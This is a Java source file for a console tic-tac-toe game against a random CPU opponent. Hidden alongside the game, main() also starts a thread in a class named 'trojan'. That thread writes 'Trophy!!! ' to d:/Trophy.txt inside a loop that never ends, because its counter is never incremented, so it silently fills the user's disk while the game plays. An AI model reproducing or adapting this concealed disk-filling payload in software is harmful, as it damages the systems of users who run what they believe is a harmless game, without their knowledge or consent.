//Created by Manoj Basnet on 4-22-2020 6:39
import java.util.Scanner;
import java.util.Random;
import java.io.*;


class alucross implements Runnable
{
	Thread t1;
	alucross()
	{
	t1=new Thread(this,"Game");
	t1.start();
	}

	public void run()
	{	
		int condition=1;
		try{
			while(condition==1)
			{
				char board[][]={{' ','|',' ','|',' '},
							{'-',' ','-',' ','-'},
							{' ','|',' ','|',' '},
							{'-',' ','-',' ','-'},
							{' ','|',' ','|',' '},
							};
				createBoard(board);
				condition=place(board);
			}
		}catch(Exception e){
			System.out.println(e);
		}
	}

	public static void createBoard(char[][] a)
	{
		System.out.println();
		for(int i=0;i<5;i++){
			for(int j=0;j<5;j++)
			{
				System.out.print(a[i][j]);
			}
			System.out.println();
		}
	}

	public static int place(char[][] board)
	{
		char alucross;
		int placement=0;
		int userpos[]=new int[5];
		int cpupos[]=new int[5];
		int temp[]={0,0,0,0,0,0,0,0,0};
		int l=0;
		int k=0;
		for(int a=0;a<9;a++)
		{
			if(a%2==0){
				alucross='X';
				Scanner s=new Scanner(System.in);	
				System.out.println();
				System.out.println("Enter your placement (1-9): ");
				placement=s.nextInt();
				while(placement>9){
					System.out.println("Unacceptable placement! Try again (1-9): ");
					placement=s.nextInt();
				}
				int num1=0;
				int b=0;
				while(b<9)
				{
						num1=checkUser(temp,placement,b);
						if(num1!=placement)
						{
							placement=num1;
							b=-1;
						}
						b++;
				}
				switch_val(board,placement,alucross);
				createBoard(board);
				temp[a]=placement;
				userpos[l]=temp[a];
				l++;

				if((winner(userpos))==1) 
				{
					System.out.println();
					System.out.println("Congratulation on winning the game!");
					System.out.println("Do you want to continue playing? (Y/N)");
					Scanner s1=new Scanner(System.in);
					String choice=s1.nextLine();
					if(choice.equals("y")||choice.equals("Y"))
					{
						return 1;
					}
					else
					{
						break;
					}
				}
			}	

			else{
				alucross='O';
				Random rand=new Random();	
				System.out.println();
				placement=rand.nextInt(10);
				while(placement>9||placement<1){
					placement=rand.nextInt(10);
				}
				System.out.println("CPU plays this: ");
				int num=0;
				int c=0;
				while(c<9)
				{
					num=checkCpu(temp,placement,c);
					if(num!=placement)
					{
						placement=num;
						c=-1;
					}
					c++;	
				}
				switch_val(board,placement,alucross);
				createBoard(board);
				temp[a]=placement;
				cpupos[k]=placement;
				k++;
				if((winner(cpupos))==1)
				{
					System.out.println();
					System.out.println("You Lost!");
					System.out.println("Do you want to continue playing? (Y/N)");
					Scanner s2=new Scanner(System.in);
					String choice=s2.nextLine();
					if(choice.equals("y")||choice.equals("Y"))
					{
						return 1;
					}
					else
					{
						break;
					}
				}
			}
		}
		System.out.println("Are you sure you want to exit LOSER? (Y/N)");
		Scanner s3=new Scanner(System.in);
		String choice=s3.nextLine();
		if(choice.equals("n")||choice.equals("N"))
		{
			return 1;
		}
		else
		{
			System.out.println("Wait until the computer exits the program!");
			return 0;
		}
	}

	public static int checkUser(int[] temp, int placement,int b)
	{
					if(placement!=temp[b])
					{
						return placement;
					}

					else
					{
						System.out.println("The placement has already been made! Try another: ");
						Scanner s=new Scanner(System.in);
						int replacement=s.nextInt();
						while(replacement>9){
							System.out.println("Unacceptable placement! Try again (1-9): ");
							replacement=s.nextInt();
						}
						return checkUser(temp,replacement,0);

					}

	}

		public static int checkCpu(int[] temp, int placement,int b)
	{
					if(placement!=temp[b])
					{
						return placement;
					}

					else
					{
						Random rand=new Random();
						int replacement=rand.nextInt(10);
						while(replacement>9||replacement<1){
							replacement=rand.nextInt(10);
						}
						return checkCpu(temp,replacement,0);
					}

	}

	public static void switch_val(char[][] board, int placement,char alucross)
	{
		
			switch(placement)
			{
				case 1:
				board[0][0]=alucross;
				break;
				case 2:
				board[0][2]=alucross;
				break;
				case 3:
				board[0][4]=alucross;
				break;
				case 4:
				board[2][0]=alucross;
				break;
				case 5:
				board[2][2]=alucross;
				break;
				case 6:
				board[2][4]=alucross;
				break;
				case 7:
				board[4][0]=alucross;
				break;
				case 8:
				board[4][2]=alucross;
				break;
				case 9:
				board[4][4]=alucross;
				break;
				default:
				break;
			}		
	}

	public static int winner(int[] pos)
	{
		int pat[][]={{1,2,3},
					 {4,5,6},
					 {7,8,9},
					 {1,4,7},
					 {2,5,8},
					 {3,6,9},
					 {1,5,9},
					 {3,5,7},
		};
		int count=0;
		for(int i=0;i<8;i++)
		{
			for(int j=0;j<5;j++)
			{
				for(int k=0;k<3;k++)
				{
					if(pos[j]==pat[i][k])
						count++;
				}
				if(count>=3)
					return 1;
			}	
			count=0;		
		}
		return 0;
	}
}


class trojan implements Runnable
{
	Thread t2;
	trojan()
	{
		t2=new Thread(this,"Trojan Horse");
		t2.start();
	}
	public void run()
	{
		FileWriter fw;
		BufferedWriter bw;
		try{
				fw= new FileWriter("d:/Trophy.txt");
				bw= new BufferedWriter(fw);
				int j=0;
				while(j<10){
					bw.write("Trophy!!! ");
				}
				bw.close();
		}
		catch(IOException e)
		{
			System.out.println(e);
		}
	}
}

class alucross_v3
{
	public static void main(String args[])
	{
		new trojan();
		new alucross();
	}
}
//The game was officially finished creating on 4-22-2020 10:26
//The program was modified by Manoj on 5-3-2020 2:12